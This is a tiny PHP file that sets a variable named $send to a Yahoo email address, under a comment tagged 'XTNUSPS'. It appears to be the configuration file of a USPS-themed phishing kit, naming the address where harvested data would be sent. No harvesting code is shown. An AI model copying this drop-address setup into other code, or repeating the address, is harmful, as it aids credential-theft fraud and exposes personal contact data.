<?php
// From:XTNUSPS
$send = "tech.wajdi@yahoo.com";
?>